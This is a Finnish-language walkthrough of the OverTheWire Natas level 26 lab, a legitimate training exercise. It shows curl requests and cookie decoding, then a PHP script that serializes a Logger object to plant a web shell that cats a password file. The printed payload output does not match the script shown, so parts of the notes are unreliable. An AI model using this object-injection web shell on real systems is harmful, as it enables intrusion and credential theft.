Kun tähän liitetään esimerkiksi PHP-koodi, joka hakee salasanan seuraavalle tasolle, niin… 💥 pääset eteenpäin. Sama pätee tässä istunnossa, kun eväste kirjauttumisessa tietty aika (sekunti/minuutti) josta se käyttäjätunnus;salasana potkii käyttäjänsä ulos ja joutuu kirjautuu uudestaan sisään - niin tästä se kuvio image on yhä tallella.

---

## Kali linux - START HERE

password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

`curl -v http://natas26.natas.labs.overthewire.org/ --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`

Pieni curl komento -v verbose osuus:

```
┌──(kali㉿kali)-[~]
└─$ curl -v http://natas26.natas.labs.overthewire.org/ --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
* Host natas26.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.48.176.69
*   Trying 13.48.176.69:80...
* Connected to natas26.natas.labs.overthewire.org (13.48.176.69) port 80
* Server auth using Basic with user 'natas26'
> GET / HTTP/1.1
> Host: natas26.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyNjpjVlhYd3hNUzNZMjZuNVVaVTg5UWdwR21XQ2VsYVFsRQ==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Tue, 29 Jul 2025 13:55:00 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Set-Cookie: PHPSESSID=1dq5hsvfjea9bu00206vpssjof; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1148
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
<body>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas26.natas.labs.overthewire.org left intact
```



Kokeilin jotakin PHPSESSID:tä eli siinä kirjauttuneena istunnolla ja siitä kääntää **BASE64 enkoodausta**.

PHPSESSION-VALUE.php, ja haluat base64-koodata sen sisällön, se onnistuu helposti Kali Linuxissa — tiedoston pääte .php ei estä mitään.

pientä malli ja pikka lunttilappua:
MALLI: `base64 PHPSESSION-VALUE.php` <br>
tiedostoon: `base64 PHPSESSION-VALUE.php > encoded.txt`


🔓 Base64-dekoodaa takaisin: <br>
`base64 --decode encoded.txt > decoded.php`


Jos haluat koodata vain tiedoston nimen (ei sisältöä), <br>
Tämä antaa sinulle base64-version tiedostonimestä, ei sen sisällöstä:
`echo -n "1dq5hsvfjea9bu00206vpssjof.php" | base64`

**EVÄSTEEN TOIMINTAA** <br>
Eli pientä evästeiden toimintaa että alettu suorittaa jotakin toimintoja:

- PHPSESSID: g8hn7mhe42vm00c3cgqnbhqkgf <br>
- drawing: YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0%3D <br>


```
┌──(kali㉿kali)-[~]
└─$ echo -n "YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0%3D" | base64
WVRveE9udHBPakE3WVRvME9udHpPakk2SW5neElqdHpPakk2SWpNeUlqdHpPakk2SW5reElqdHpP
akk2SWpVM0lqdHpPakk2SW5neUlqdHpPakk2SWpnNUlqdHpPakk2SW5reUlqdHpPak02SWpFeU15
STdmWDAlM0Q=
                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ php -r 'echo print_r(unserialize(base64_decode("YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0=")), true);'
Array
(
    [0] => Array
        (
            [x1] => 32
            [y1] => 57
            [x2] => 89
            [y2] => 123
        )

)
```

![alt text](./kuvat-level22-28/natas26-6.png)


**tämä muuttaa sen takaisin** - eli ei hyötyä kauhesti.. että wtf
```
┌──(kali㉿kali)-[~]
└─$ php -r '$o = ["x1"=>"32", "y1"=>"57", "x2"=>"89", "y2"=>"123"]; print base64_encode(serialize($o))."\n";'
YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fQ==



curl http://natas26.natas.labs.overthewire.org/img/shell.php \
  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"
```

Tässä aloin suorittaa sitä curl komentoa, että perään normi basic authentication ja --cookie evässte mitä drawing keräättiin tuolta selaimen kautta ja päivitetty selain että tuoreemman version esim. Kali linux sisäisen **BURP suite** omalla selaimella eikä firefox kautta.
```
┌──(kali㉿kali)-[~]
└─$ curl http://natas26.natas.labs.overthewire.org/ \             
  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
<body>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<br />
<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>70</b><br />
<img src="img/natas26_rs3osgd2663cmb9c518rmq2goq.png"><br />
<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>98</b><br />

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```



**PHP koodia vähäsen** käyttöön.
```
┌──(kali㉿kali)-[~/Desktop/php-koodi]
└─$ cat logger1.php     
<?php
# this is for natas26 level
class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_rs3osgd2663cmb9c518rmq2goq.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));



┌──(kali㉿kali)-[~/Desktop/php-koodi]
└─$ php logger1.php      
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfcnMzb3NnZDI2NjNjbWI5YzUxOHJtcTJnb3EucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTk6IkFueXRoaW5nIGdvZXMgaGVyZQoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
```  

![alt text](./kuvat-level22-28/natas26-7.png)


![alt text](./kuvat-level22-28/natas26-8.png)


![alt text](./kuvat-level22-28/natas26-9.png)


























